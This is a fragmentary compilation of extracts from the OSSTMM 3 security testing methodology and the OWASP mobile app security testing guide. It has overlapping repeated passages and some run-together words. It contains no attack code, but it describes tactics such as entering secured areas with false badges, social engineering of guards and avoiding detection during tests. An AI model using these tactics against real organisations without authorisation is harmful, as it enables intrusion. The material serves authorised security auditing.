This methodology requires both active and passive tests. Furthermore, the Analyst may not be able to differentiate between data collected passively from emanations of the operations and that which is the delayed or misdirected response to agitation. The introduction of any outside event, including the passive kind, has the potential to change the nature of the target’s operations and lower the quality of an uninfluenced test on operational security. However, this does not represent a failure of the Analyst or the audit process, but simply an unavoidable evil of testing a system in a stochastic environment over a linear time frame. Simply put, the Analyst often cannot “take back” the agitation once it has been set in motion and any corrections will cause additional and varied results that do not match the aim of the original task. This is important because it will make it difficult to later compare results. It will also mean that prior tests will influence later tests due to the “memory” of the impact of the test. This is very noticeable in testing over the PHYSSEC channel. It is important to note that when harmonizing the OSSTMM with other testing standards, it is important not to constrict the flow of this methodology by introducing standards so formal and unrelenting that the quality of the test suffers.

Scenario 1 The Analyst tests entry into a secured area with false authentication. The guard examines the badge briefly and allows the Analyst to enter. The Analyst performs the audit to the point where the Analyst is identified and the nature of the audit is revealed, if at all. Scenario 2 The Analyst tests entry into a secured area with false authentication. The guard examines the badge briefly and doubting its authenticity, does not allow the Analyst to enter. The Analyst tries additional tactics until entry is gained. The Analyst performs the audit to the point where the Analyst is identified and the nature of the audit is revealed, if at all. In both scenarios 1 and 2, there may or may not be a record of the entry attempt. If there is a record, that record can be re-used either by the Analyst the next time if the badge is denied as proof of its authenticity or by the guard who may be doubting its authenticity and wants to see what other guards have done. For the next audit, the Analyst may try the same badge again, attempt other means to gain entry through social engineering techniques, or try using a different badge. That guard, other guards that the guard may have spoken with, and any log records of either the",

For the next audit, the Analyst may try the same badge again, attempt other means to gain entry through social engineering techniques, or try using a different badge. That guard, other guards that the guard may have spoken with, and any log records of either the successful or failed attempt are all memories of the Analyst, the technique, and should the guard know of the audit, the audit itself. However, should scenario 2 occur, it is possible that the interaction escalating through the additional techniques used by the Analyst means that scenario 2 is a more thorough test as more tests are made within the same interaction. It also means that the audit and the Analyst will more likely be remembered by the guard. If the Analyst does not gain entry at all, then the completeness of the test is limited as to when the Analyst ran out of techniques, with each failed technique making entry that much more difficult. If the Analyst goes through all techniques outlined by tasks in the methodology, then the tests have been completed. If not, then the tests not yet conducted need to be tried on a different guard with different results as different people behave differently. While this may seem to be a human problem, it is not. A door or window forced open too often will remain damaged until it is replaced. Physical use always results in physical deterioration. Even in wired communications, the act of snooping traffic will cause delays (sometimes noticeable) or change power consumption, both with either direct or indirect and often varied results.

Depending on the thoroughness, business, time allotment, and requirements of the audit, the Analyst may want to schedule the details of the audit by phase. There are four phases in the execution of this methodology: A. Induction Phase B. Interaction Phase C. Inquest Phase D. Intervention Phase Each phase lends a different depth to the audit, but no single phase is less important than another in terms of Actual Security. A. Induction Phase Every trip begins with a direction. In the induction phase, the Analyst begins the audit with an understanding of the audit requirements, the scope, and the constraints to the auditing of this scope. Often, the test type is best determined after this phase.

Intervention Phase These tests are focused on the resources the targets require in the scope. Those resources can be switched, changed, overloaded, or starved to cause penetration or disruption. This is often the final phase of a security test to assure disruptions do not affect responses of less invasive tests and because the information for making these tests may not be known until other phases have been carried out. The final module, D.17, of Alert and Log Review, is required to verify prior tests which provided no interactivity back to the Analyst. Most security tests that do not include this phase may still need to run an end review from the perspective of the targets and assets to clarify any anomalies.

Testing this channel requires interaction with people in gatekeeper positions of assets. This channel covers the involvement of people, primarily the operating personnel within the target scope or framework. While some services consider this simply as “social engineering”, the true compliance objective of security testing in this channel is personnel security awareness testing and gap measurement to the required security standard outlined in company policy, industry regulations, or regional legislation. The Analyst will be required to have multiple tools and methods for the completion of some tasks to assure that suspicion is not raised among personnel and tests are not made invalid due to an early discovery or heightened paranoia. It may also be pertinent to limit test subjects to one per department or other boundary. Competent Analysts will require both diligent people skills and critical thinking skills to assure factual data collection creates factual results through correlation and analysis. Considerations Please note the following considerations to assure a safe, high quality test: 1.

Testing this channel requires non-communicative interaction with barriers and humans in gatekeeper positions of assets. This channel covers the interaction of the Analyst within proximity of the targets. While some services consider this simply as “breaking and entering”, the true compliance objective of security testing in this channel is physical and logical barrier testing and gap measurement to the required security standard as outlined in company policy, industry regulations, or regional legislation. The Analyst will be required to have multiple tools and methods for the completion of some tasks to assure that suspicion is not raised among personnel and tests are not made invalid due to an early discovery or heightened paranoia. It may also be pertinent to limit test subjects to one per department or other boundary. Analysts will also need to be prepared for the possibility of accidental bodily harm from conventional barriers and weapons, interactions with animals, subjection to harmful bacteria, viruses, and fungi, exposure to electromagnetic and microwave radiation, especially that which can permanently damage hearing or sight, and poisonous or corrosive chemical agents in any form. Competent Analysts will require physical strength, endurance, agility, and critical thinking skills to assure factual data collection creates factual results through correlation and analysis.

Conatus: All attempts to traverse physical barriers require an unbiased judgment of the amount of difficulty required to reach and interact with the target and the danger involved. These considerations are to be made with regard to the “will to live” of humans as well as any effect on the targets should the attack be made without regard for life (suicidal). 2. Ecce hora: All physical tests require close attention be made to time. Records must be kept of the time the test is made, time on target, and time the test finishes, whether successful or not, because that will also assist in determining what can be accomplished within the time range to fail. Knowing such information can help understand what may be a deceptive attack so as to be sure",

Knowing such information can help understand what may be a deceptive attack so as to be sure resources are not wasted in one area while leaving another open. 3. Abuse of discretion: The Analyst must take care not to ignore or misinterpret the results from testing a physical barrier or obstacle because it is not within the range of the Analyst’s physical possibilities. The Analyst should remain unbiased and not over-estimate or over-value personal skills and ability and instead apply the tests as a highly skilled and highly able person could. 4. Magister pecuarius: The Analyst should not dismiss the reasonable potential of an attacker using trained animals to circumvent barriers and obstacles where a human being cannot. 5. Plausible deniability: No direct or physical personnel security testing will take place for personnel who have not been trained, informed, or can be said to possess security awareness experience or obligations due to job responsibility requirements. 6. Sui generis: All interaction with physical barriers will leave record of this interactivity and, in more extreme cases, may weaken or destroy the barrier. The Analyst should take care in testing one-of- a-kind type targets which may not be replaceable. The Analyst should also take care not to leave permanent markings wherever possible and to keep record of all barriers tested to verify them for damage after the audit.

Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 137\\nChapter 9 - Wireless Security Testing Spectrum security (SPECSEC) is the security classification which includes electronics security (ELSEC), signals security (SIGSEC), and emanations security (EMSEC). ELSEC are the measures to deny unauthorized access to information derived from the interception and analysis of non-communications electromagnetic radiations. SIGSEC are the measures to protect wireless communications from unauthorized access and jamming. EMSEC are the measures to prevent the machine emanations that, if intercepted and analyzed, would disclose the information transmitted, received, handled, or otherwise processed by information systems equipment. Testing this channel requires interaction with barriers to assets over Electromagnetic (EM) and Microwave (MW) frequencies. This channel covers the interaction of the Analyst within proximity range of the targets. While some services consider this simply as “scanning”, the true compliance objectives of security testing in this channel are physical and logical barrier testing and gap measurement to the required security standard outlined in company policy, industry regulations, or regional legislation. The Analyst will be required to have adequate protection from electromagnetic power sources and other forms of radiation. Analysts will also need to be prepared for the possibility of accidental bodily harm from exposure to electromagnetic and microwave radiation, especially that which can permanently damage hearing or sight. Proper equipment should warn when within range of Electromagnetic and Microwave radiation from -12dB and greater. Specific frequencies may adversely affect implanted medical devices, cause vertigo, headaches, stomach cramps, diarrhea, and other discomforts on both an emotional and physical level. Competent Analysts will require sufficient knowledge of EM and MW radiation and critical thinking skills to assure factual data collection creates factual results through correlation and analysis. Considerations Please note the following considerations to assure a safe, high quality test: 1. Ignorantia legis neminem excusat: Analysts who do not do proper posture review for the scope as well as the regions targeted for business or interactions may not escape punishment for violating laws merely because they were unaware of the law; that is, Analysts have presumed knowledge of the law. Analysts are considered professionals in this subject matter and, therefore, the assumption exists that even regarding what may not be common knowledge for the average person about a foreign region’s laws regarding EM and MW communication systems, will be known to",

In personam: Testing must specifically target only SPECSEC from personnel who are under direct legal contract with the scope owner, computer systems on the property of the scope owner, and EM or MW signals or emanations of power level great enough to disrupt or harm wireless communications within the scope. Analysts must make efforts to not invade upon a person’s private life such as listening to or recording personal communications originating within the scope, where that private life has made efforts to separate itself from the scope.

This channel covers the interaction of the Analyst with the targets. While some services consider this simply as “phreaking”, the true compliance objective of security testing in this channel is logical barrier testing and gap measurement against the required security standard as outlined in company policy, industry regulations, or regional legislation. The Analyst will be required to have multiple tools and methods for the completion of some tasks to assure that suspicion is not raised among personnel by continual and sequential ringing of phones and that tests are not made invalid due to an early discovery or heightened paranoia. Analysts will also need to be prepared for working with both digital and analog telecommunications equipment, sound frequency analyzers, and within information networks providing regional content through local phone providers. Competent Analysts will require an electronics background in both analog and digital telephony and critical thinking skills to assure factual data collection creates factual results through correlation and analysis.

This channel covers the involvement of computer systems, primarily the operating networks within the target scope or framework. While some organizations consider this simply as “penetration testing”, the true compliance objective of security testing in this channel is system interaction and operational quality testing with gap measurements to the required security standard outlined in company policy, industry regulations, or regional legislation. During testing, end operators and artificial intelligence can recognize on-going attacks both by process and signature. For this reason, the Analyst will be required to have a sufficient variety of methods to avoid disclosure of the tests or work with the operators to assure that where security fails and where it succeeds is brought to light. Tests which focus only on the discovery of new problems only leave room for fixes and not designs for future improvements. Competent Analysts will require adequate networking knowledge, diligent security testing skills, and critical thinking skills to assure factual data collection creates factual results through correlation and analysis. Considerations Please note the following considerations to assure a safe, high quality test: 1. Ignorantia legis neminem excusat: Analysts who do not do proper posture review for the scope as well as the regions targeted for business or interactions may not escape punishment for violating laws merely because they were unaware of the law; that is, persons have presumed knowledge of the law. Analysts are considered professionals in this subject matter and, therefore,",

Analysts are considered professionals in this subject matter and, therefore, the assumption exists that what may not be common knowledge for a normal person about a foreign region’s laws regarding computer systems, professionals make themselves aware of the laws necessary to engage in that undertaking. 2. Property rights: Testing must specifically target only systems which are under direct legal ownership with the scope owner and computer systems on the property of the scope owner. Any personal effect should remain personal and private unless it specifically involves the scope owner through disparagement, false light, competitiveness, or reasons stated in personnel contract agreements. Analysts must make efforts to not invade upon a person’s private life where that private life has made efforts to separate itself from the scope. Analysts with special agreements to test systems which are under direct contract but not owned or are owned but not housed at the owner’s legal property must take great caution to assure tests have minimum impact on other systems and tertiary parties outside the scope or contract.

This review forms a matrix against which testing should be mapped but not constrained due to the ubiquity of the channel endpoints. Therefore, it is important to consider, as some legislation requires, the target market or end users of this channel which must also be added to the scope for this module. 11.1.1 Policy Review and document appropriate organizational policy regarding security, integrity, and privacy requirements of the scope. Review and document contracts and Service Level Agreements (SLAs) with service providers and other involved third parties. 11.1.2 Legislation and Regulations Review and document appropriate regional and national legislation, and industry regulations regarding the security and privacy requirements of the organization in the scope as well as that which includes the appropriate customers, partners, organizational branches, or resellers outside the scope. 11.1.3 Culture Review and document appropriate organizational culture in the scope towards security and privacy awareness, required and available personnel training, organizational hierarchy, help desk use, and requirements for reporting security issues. 11.1.4 Age Review and document the age of systems, software, and service applications required for operations. 11.1.5 Fragile Artifacts Review and document any systems, software, and service applications which require special care due to high use, instabilities, or a high rate of change.

Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 184\\nChapter 12 - Compliance Compliance is alignment with a set of general policies, where the type of compliance required depends upon the region and currently ruling government, industry and business types, and supporting legislation. Compliance is compulsory; however, as with any other threat, a risk assessment must be made whether or not to invest in any type of compliance. Often, compliance is not as black and white as it appears to be. The OSSTMM recognizes three types of compliance: 1. Legislative. Compliance with legislation is in accordance to the region where the legislation can be enforced. The strength and commitment to the legislation comes from previously successful legal arguments and appropriately set and just enforcement measures. Failure to comply with legislation may lead to criminal charges. Examples are Sarbanes-Oxley, HIPAA, and the various Data Protection and Privacy legislation. 2. Contractual. Compliance to contractual requirements are in accordance to the industry or within the group that requires the contract and may take action to enforce compliance. Failure to comply with contractual requirements often leads to dismissal from the group, a loss of privileges, loss of reputation, civil charges, and in some cases where legislation exists to support the regulatory body, criminal charges. An example is the payment card industry data security standard (PCI DSS) promoted and required by VISA and MasterCard. 3. Standards based. Compliance to standards is in accordance with the business or organization where the compliance to standards is enforced as policy. Failure to comply with standards often leads to dismissal from the organization, a loss of privileges, a loss of reputation or brand trust, civil charges, and in some cases where legislation exists to support the policy makers, criminal charges. Examples are the OSSTMM, ISO 27001/5, and ITIL. The OSSTMM is developed with concern for major legislation, contractual requirements, and standards conformance. As not all compliance objectives are created equally, the main focus of the OSSTMM is security. Compliance measures that require specific products or services, commercial or otherwise, often through specially lobbied efforts, may have good intentions; however, may actually be a waste of resources or a lesser version of security than is desired. That a compliance objective can require a specific product at all should be illegal itself. As legislation and regulation may be audited either under the letter of the law or the spirit of the law, depending upon the auditing body, proving",

As legislation and regulation may be audited either under the letter of the law or the spirit of the law, depending upon the auditing body, proving proper and valid operational protection and controls such that as can be proved by an OSSTMM test may or may not be satisfactory. Therefore, in addition a certified OSSTMM test complete with the STAR should also be presented to the appropriate auditing bodies. The following list is only for compliance which has been verified with the OSSTMM and does not limit the actual scope of regulatory and legislative bodies for which this standard may apply.

The people, processes, systems, and software all have some type of relationship. This interconnectedness requires interactions. Some interactions are passive and some are not. Some interactions are symbiotic while others are parasitic. Some interactions are controlled by one side of the relationship while others are controlled by both. Then some controls are flawed or superfluous, which is harmful to at least one side of the relationship, if not both. Other controls balance perfectly with the interactions. Whatever becomes of the interconnectedness, however the interactions occur, however they are controlled, they are the operations that make survival possible. When we test operations we get the big picture of our relationships. We get to see the interconnectedness of the operations in fine detail. We get to map out how we, our businesses, and our operations will survive and even thrive. Unfortunately, how we interact is just based on a collection of biases we accumulate during life, which are subjected to the emotional or bio-chemical state we are under when we have them. These are our shortcuts. Due to the incredible number of decisions we must make through-out all of our interactions we use a mental cheat-sheet to compare similar interactions rather than calculate each situation independently. We are, after all, only human. Most often though our opinions are limited and restricted to a small scope we know as “our little world”. We apply them everywhere because they make life easier. But when we take them with us and try to adhere them to larger, different, more complicated series and types of interactions, we will likely make mistakes. What may make perfect sense to",

    "text": "small scope we know as “our little world”. We apply them everywhere because they make life easier. But when we take them with us and try to adhere them to larger, different, more complicated series and types of interactions, we will likely make mistakes. What may make perfect sense to us based on our experiences may not make any sense at all outside of “our little world”. So what we need is a better, less biased way of looking at the bigger, more dynamic, less personal, world beyond ourselves. Furthermore, our little world is something we take around with us. When we are outside, our little world is outside with us. We interact in the space on the assumptions and prejudices we know and carry. When we go inside, we take our little world inside with us. This means we bring our ways of doing things and new interactions into a new environment. And it has always been this way. There is no perimeter. There is no us and them. It is each individual interacting and interconnecting with everyone and everything; each individual with their own little world of issues and preconceptions impacting on the rest, while at the same time being impacted by others. This means we need a way to see more than just the bigger world; we also need a way to see into each individual’s own little worlds too. Often the difficulty in creating security is blamed on the sophistication and the persistence of the attacks. However that only serves to shift the blame, but not solve the problem. The real challenge is in protecting particular interactions in an interconnected world filled with uncontrollable elements. Taken at face value, the sheer number of interactions may be daunting. Protection solutions often address this challenge by broadly addressing particular types of interactions or by monitoring all interactions as they occur for malicious intent. Unfortunately, broad security programs and processes cannot address enough of the elements as to provide significant protection. This leads security in practice to be more of an art depending on the practitioner to apply their own little world to the challenge of security. This can only add more complexity and new problems. The means to finding global, persistent protection in perfect balance with operations is through the Möbius Defense. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 204\\nThe Möbius Defense Due to the multitude of means in which interactions occur to and from any organization, such as the various Channels and vectors, the perimeters to be defended appear to take the shape of a Möbius strip. A Möbius Strip is a shape with no inside or outside which means there is no “side” to defend from. Therefore, what is needed is a defense designed to protect an environment where in each individual can be interacting and interconnecting with everyone and everything. The Möbius Defense does this in three steps: 1. Improving verification and analysis: verify and analyze operations for interactions and controls and not just",

The Möbius Defense does this in three steps: 1. Improving verification and analysis: verify and analyze operations for interactions and controls and not just flaws. 2. Establishing defense in width: apply defensive tactics to balance the controls of all interactions with operations. 3. Implementing a trust strategy: compartmentalize how interactions are authorized or controlled. 1. Improving Verification and Analysis The practice of verifying operational security must include more than just finding flaws. There needs to be a better accounting for and understanding of errors that will make tests inaccurate. There needs to be an improvement in test accuracy through a better understanding of what to test and when to test it. Increasing the accuracy of test results will serve to both provide results that can be repeated and results which can be used to make consistent measurements. The security test must catalog and classify all points of interaction, determine which controls exist for those interactions, and verify the functionality of those controls. Flaws within the scope or the controls must be classified by how they affect operations and not the possible or potential risk they pose to operations. The security test must also track that which was not tested and which tests were not performed to assure repeatability and fair comparisons with past and future tests. Finally, the testing Analyst must be capable of properly understanding the results of the test and what they mean for operations. The means to do all of this are provided within this manual. 2. Establishing Defense in Width The main concept behind a Möbius Defense is to provide Defense in Width and a balanced variety of controls to each interactive point. A perfect balance is achieved with the flawless application of all ten types of operational controls for each interactive point. This differs from Defense in Depth by assuring different types of controls applied to all interactive points rather than just any controls at various points within a process. With new information from the security test, a defensive posture can be created by verifying that a balance of controls exists at all points of interaction. This changes the environment in which inter-connectivity occurs, and curtails the possible operational changes caused by chaotic elements either inside or outside. The balance of controls is important because each control can add to the attack surface of an operation. Assuring a balance also assures that different types of controls are used which provide protection in different ways. This increases the range of attack types and problems that the interactive point can be defended against. The ravs are to be used to measure the amount of balance attained and to assure balance is maintained as new operations are introduced to the scope.

Implementing a Trust Strategy To know which interactions require less balance than others from Defense in Width is a matter of knowing which interactions we should trust. For the operations we have less reason to trust, we should apply more of the ten controls to achieve perfect balance. Individuals we have less reason to trust we place in environments where all interactions are protected by more of the ten controls. Conversely, trustworthy individuals can be authorized to have more individual control over the interactions in their environment. Finally we should separate elements from the environment when no significant reason to trust or benefit to the operation can be found in those elements. Doing so will also keep Defense in Width within a reasonable scale of operations so that efficiency and expense do not outweigh the benefits of protection. The trust metrics provided within this manual assure that the reasons to trust are based on facts. As the reasons to trust approach 100% we are not only certain that the individual or the operation are incapable of malicious or accidental damage but that it has been proven. This is no risk assessment or guess based on what we know from our “own little world.” The difficulty in this process however may be in assigning trust metrics to people. Unlike the informal and almost capricious way trust is often assigned, this new manner may seem cold and heartless. But it isn’t because while you are investigating what reasons you have to trust someone you are also able to fully inform them of what they can do to give you more reason to trust them. The typical means of trusting or not trusting is not so specific, nor is it so kind. It is more of a social game of being likeable or not to the person providing the authorization. The trust metrics are more transparent and more neutral aside from how someone feels based on their “own little world.” The trust metrics can even be verified by others, such as a board or a department, who can maintain the trust calculations neutrally and re-assess regularly or whenever it’s necessary. Get What We Need The application of the Möbius Defense has many ramifications. First, it assures that the results of security tests are the facts. It assures that the tests have been thorough and based on the processes of operations and not the skills of the Analyst. This provides an organization with an incredible amount of intelligence over their own operations for comparisons with other organizations, or even just trending self assessments. It is the kind of information that decisions require, and that which foster significant operational improvements. Second, it changes the frequency",

This provides an organization with an incredible amount of intelligence over their own operations for comparisons with other organizations, or even just trending self assessments. It is the kind of information that decisions require, and that which foster significant operational improvements. Second, it changes the frequency of security tests required because, instead of defenses being based on reacting to attacks and vulnerabilities, they are part of change control instead. Therefore when new operations are initiated, the environment will be re-assessed for new or different points of interaction. The need to test for new flaws is no longer necessary nor is the need to test for compatibility of security updates after fixing those flaws. Security updates, if desired, will instead become part of the change control process and can be tested on schedule. This will drastically reduce the time spent putting out fires so that new focus can be put on improving operations and building better infrastructure. Third, it changes the often secretive and socially demanding way we use trust within organizations. It allows the performance and history of each individual to speak for itself. This adds accountability to each role and removes prejudices that can strangle an organization, either operationally or legally. Not to mention it is the most fair means of assuring each person has the responsibility over their own successes and failures. The changes required by the typical organization to achieve these benefits are actually small. The changes required by the security industry to meet the new needs of the implementers of the Möbius Defense will be huge. And change will bring new opportunities.

Not everyone behaves as trained. Therefore the truth of configuration and training is in the resulting operations. That’s why we need to test operations. The Open Source Security Testing Methodology Manual strives to be the ultimate security guide. Better known to security experts and hackers alike as the OSSTMM, spoken like “awesome” but with a “t”, is a formal methodology for breaking any security and attacking anything the most thorough way possible. Released for free for the first time in 2001 as the underdog to the security industry’s product- focused security advice, the manual achieved an instant following. Being open to anyone for peer review and further research led to it growing from its initial 12 page release to its current size of over 200 pages. For testing security operations and devising tactics it has no equal. The OSSTMM is in its third version and is a complete re-write of the original methodology. It now includes the ever-elusive security and trust metrics at its foundation. It required 7 years of research and development to produce the perfect operational security metric, an algorithm which computes the Attack Surface of anything. In essence, it is a numerical scale to show how unprotected and exposed something currently is. Security professionals, military tacticians, and security researchers know that without knowing how exposed a target is, it’s just not possible to say how likely a threat will cause damage and how much. But to know this requires a thorough security test which happens to be exactly what the OSSTMM provides. To say the OSSTMM 3 is a very thorough methodology is an understatement. It covers proper attack procedures, error handling, rules of engagement, proper analysis, critical security thinking, and trust metrics. It provides 17 modules like Visibility Audit, Trust Verification, Property Validation, and Competitive Intelligence Scouting, each which describes multiple attacks (called Tasks), for 5 different interaction types with a target (called Channels) organized by technical knowledge and equipment requirements as Human, Physical, Telecommunications, Data Networks, and Wireless. The OSSTMM has indeed become a complex organism but with a new focus on readability and usability, it is far from complicated to use. Security doesn’t have to last forever; just longer than everything else that might notice it’s gone.

Securityconcernsformobile apps differ from traditional desktop software in some important ways. Modern mobile operating systems are arguably moresecurethantraditionaldesktopoperatingsystems,butproblemscanstillappearwhenwedon’tcarefullyconsider security during mobile app development. Data storage, inter-app communication, proper usage of cryptographic APIs, andsecurenetworkcommunicationareonlysomeoftheseconsiderations. The OWASP Mobile Application Security Verification Standard (MASVS) defines a mobile app security model and lists genericsecurityrequirementsformobileapps. Itcanbeusedbyarchitects,developers,testers,securityprofessionals, andconsumerstodefineandunderstandthequalitiesofasecuremobileapp. TheOWASPMobileApplicationSecurity TestingGuide(MASTG)mapstothesamebasicsetofsecurityrequirementsofferedbytheMASVSanddependingonthe contexttheycanbeusedindividuallyorcombinedtoachievedifferentobjectives. Forexample,theMASVSrequirementscanbeusedinanapp’splanningandarchitecturedesignstageswhilethechecklist andtestingguidemayserveasabaselineformanualsecuritytestingorasatemplateforautomatedsecuritytestsduring orafterdevelopment. Inthe“MobileAppSecurityTesting”chapterwe’lldescribehowyoucanapplythechecklistand MASTGtoamobileapppenetrationtest. Key Areas in Mobile Application Security Many mobile app penetration testers have a background in network and web app penetration testing, a quality that is valuable for mobile app testing. Almost every mobile app talks to a backend service, and those services are prone to the same types of attacks we are familiar with in web apps on desktop machines. Mobile apps differ in that there is a smallerattacksurfaceandthereforemoresecurityagainstinjectionandsimilarattacks. Instead,wemustprioritizedata protectiononthedeviceandthenetworktoincreasemobilesecurity. Let’sdiscussthekeyareasinmobileappsecurity. 25\\nData Storage and Privacy (MASVS-STORAGE) Theprotectionofsensitivedata,suchasusercredentialsandprivateinformation,iscrucialtomobilesecurity. Ifanapp usesoperatingsystemAPIssuchaslocalstorageorinter-processcommunication(IPC)improperly,theappmightexpose sensitivedatatootherappsrunningonthesamedevice. Itmayalsounintentionallyleakdatatocloudstorage,backups, orthekeyboardcache. Additionally,mobiledevicescanbelostorstolenmoreeasilycomparedtoothertypesofdevices, soit’smorelikelyanindividualcangainphysicalaccesstothedevice,makingiteasiertoretrievethedata. Whendevelopingmobileapps,wemusttakeextracarewhenstoringuserdata. Forexample,wecanuseappropriatekey storageAPIsandtakeadvantageofhardware-backedsecurityfeatureswhenavailable. FragmentationisaproblemwedealwithespeciallyonAndroiddevices. NoteveryAndroiddeviceoffershardware-backed securestorage, andmanydevicesarerunningoutdatedversionsofAndroid. Foranapptobesupportedontheseout- of-date devices, it would have to be created using an older version of Android’s API which may lack important security features. Formaximumsecurity,thebestchoiceistocreateappswiththecurrentAPIversioneventhoughthatexcludes someusers. Cryptography (MASVS-CRYPTO) Cryptography is an essential ingredient when it comes to protecting data stored on a mobile device. It is also an area wherethingscangohorriblywrong,especiallywhenstandardconventionsarenotfollowed. Itisessentialtoensurethat theapplicationusescryptographyaccordingtoindustrybestpractices,includingtheuseofprovencryptographiclibraries, aproperchoiceandconfigurationofcryptographicprimitivesaswellasasuitablerandomnumbergeneratorwherever randomnessisrequired. Authentication and Authorization (MASVS-AUTH) Inmostcases,sendinguserstologintoaremoteserviceisanintegralpartoftheoverallmobileapparchitecture. Even thoughmostoftheauthenticationandauthorizationlogichappensattheendpoint,therearealsosomeimplementation challengesonthemobileappside. Unlikewebapps,mobileappsoftenstorelong-timesessiontokensthatareunlocked withuser-to-deviceauthenticationfeaturessuchasfingerprintscanning. Whilethisallowsforaquickerloginandbetter userexperience(nobodylikestoentercomplexpasswords),italsointroducesadditionalcomplexityandroomforerror. Mobileapparchitecturesalsoincreasinglyincorporateauthorizationframeworks(suchasOAuth2)thatdelegateauthen- ticationtoaseparateserviceoroutsourcetheauthenticationprocesstoanauthenticationprovider.

Today, the Android and iOS operating systems cumulatively comprisemore than 99% of the mobile OS marketshare. Additionally,mobileInternetusagehassurpasseddesktopusageforthefirsttimeinhistory,makingmobile browsingandappsthemostwidespreadkindofInternet-capableapps.

Throughoutthefollowingchapter,wewilldefinecharacteristicsthat qualifyanappforitsrespectiveplaceinmobileapptaxonomyaswellasdiscussdifferencesforeachvariation. Native App Mobileoperatingsystems,includingAndroidandiOS,comewithaSoftwareDevelopmentKit(SDK)fordevelopingapps specifictotheOS.Suchappsarereferredtoasnativetothesystemforwhichtheyhavebeendeveloped. Whendiscussing an app, the general assumption is that it is a native app implemented in a standard programming language for the respectiveoperatingsystem-Objective-CorSwiftforiOS,andJavaorKotlinforAndroid. Nativeappsinherentlyhavethecapabilitytoprovidethefastestperformancewiththehighestdegreeofreliability. They usuallyadheretoplatform-specificdesignprinciples(e.g.theAndroidDesignPrinciples),whichtendstoresultinamore consistentuserinterface(UI)comparedtohybridorwebapps. Duetotheircloseintegrationwiththeoperatingsystem, native apps can directly access almost every component of the device (camera, sensors, hardware-backed key stores, etc.). Some ambiguity exists when discussing native apps for Android as the platform provides two development kits - the AndroidSDKandtheAndroidNDK.TheSDK,whichisbasedontheJavaandKotlinprogramminglanguage,isthedefault fordevelopingapps. TheNDK(orNativeDevelopmentKit)isaC/C++developmentkitusedfordevelopingbinarylibraries thatcandirectlyaccesslowerlevelAPIs(suchasOpenGL).Theselibrariescanbeincludedinregularappsbuiltwiththe SDK.Therefore,wesaythatAndroidnativeapps(i.e.builtwiththeSDK)mayhavenativecodebuiltwiththeNDK.

Sinceawebapptypicallytargets multiple platforms, their UIs do not follow some of the design principles of a specific platform. The biggest advantage is reduced development and maintenance costs associated with a single code base as well as enabling developers to 28\\ndistributeupdateswithoutengagingtheplatform-specificappstores. Forexample,achangetotheHTMLfileforaweb app can serve as viable, cross-platform update whereas an update to a store-based app requires considerably more effort.

Thesamebasicrequirementsandtestcasesapplytobothcontexts,butthehigh-levelmethodand thelevelofclientinteractiondiffer. Principles of Testing White-box Testing versus Black-box Testing Let’sstartbydefiningtheconcepts: • Black-box testing is conducted without the tester’s having any information about the app being tested. This processissometimescalled“zero-knowledgetesting”. Themainpurposeofthistestisallowingthetestertobehave likearealattackerinthesenseofexploringpossibleusesforpubliclyavailableanddiscoverableinformation. • White-box testing (sometimes called “full knowledge testing”) is the total opposite of black-box testing in the sensethatthetesterhasfullknowledgeoftheapp. Theknowledgemayencompasssourcecode,documentation, anddiagrams. Thisapproachallowsmuchfastertestingthanblack-boxtestingduetoitstransparencyandwith theadditionalknowledgegainedatestercanbuildmuchmoresophisticatedandgranulartestcases. • Gray-box testing is all testing that falls in between the two aforementioned testing types: some informationis providedtothetester(usuallycredentialsonly),andotherinformationisintendedtobediscovered. Thistypeof testing is an interesting compromise in the number of test cases, the cost, the speed, and the scope of testing. Gray-boxtestingisthemostcommonkindoftestinginthesecurityindustry. Westronglyadvisethatyourequestthesourcecodesothatyoucanusethetestingtimeasefficientlyaspossible. The tester’scodeaccessobviouslydoesn’tsimulateanexternalattack,butitsimplifiestheidentificationofvulnerabilitiesby allowingthetestertoverifyeveryidentifiedanomalyorsuspiciousbehavioratthecodelevel. Awhite-boxtestistheway togoiftheapphasn’tbeentestedbefore. EventhoughdecompilingonAndroidisstraightforward,thesourcecodemaybeobfuscated,andde-obfuscatingwillbe time-consuming. Timeconstraintsarethereforeanotherreasonforthetestertohaveaccesstothesourcecode. Vulnerability Analysis Vulnerability analysis is usually the process of looking for vulnerabilities in an app. Although this may be done manu- ally,automatedscannersareusuallyusedtoidentifythemainvulnerabilities. Staticanddynamicanalysisaretypesof vulnerabilityanalysis. Static versus Dynamic Analysis StaticApplicationSecurityTesting(SAST)involvesexamininganapp’scomponentswithoutexecutingthem,byanalyzing thesourcecodeeithermanuallyorautomatically. OWASPprovidesinformationaboutStaticCodeAnalysisthatmayhelp youunderstandtechniques,strengths,weaknesses,andlimitations. 30\\nDynamic Application Security Testing (DAST) involves examining the app during runtime. This type of analysis can be manual or automatic. It usually doesn’t provide the information that static analysis provides, but it is a good way to detectinterestingelements(assets,features,entrypoints,etc.) fromauser’spointofview. Nowthatwehavedefinedstaticanddynamicanalysis,let’sdivedeeper. Static Analysis Duringstaticanalysis,themobileapp’ssourcecodeisreviewedtoensureappropriateimplementationofsecuritycontrols. Inmostcases,ahybridautomatic/manualapproachisused. Automaticscanscatchthelow-hangingfruit,andthehuman testercanexplorethecodebasewithspecificusagecontextsinmind. Manual Code Review A tester performs manual code review by manually analyzing the mobile app’s source code for security vulnerabilities. Methods range from a basic keyword search via the ‘grep’ command to a line-by-line examination of the source code. IDEs(IntegratedDevelopmentEnvironments)oftenprovidebasiccodereviewfunctionsandcanbeextendedwithvarious tools. A common approach to manual code analysis entails identifying key security vulnerability indicators by searching for certain APIs and keywords, such as database-related method calls like “executeStatement” or “executeQuery”. Code containingthesestringsisagoodstartingpointformanualanalysis. In contrast to automatic code analysis, manual code review is very good for identifying vulnerabilities in the business logic, standards violations, and design flaws, especially when the code is technically secure but logically flawed. Such scenariosareunlikelytobedetectedbyanyautomaticcodeanalysistool. Amanualcodereviewrequiresanexpertcodereviewerwhoisproficientinboththelanguageandtheframeworksused forthemobileapp. Fullcodereviewcanbeaslow, tedious, time-consumingprocessforthereviewer, especiallygiven largecodebaseswithmanydependencies.

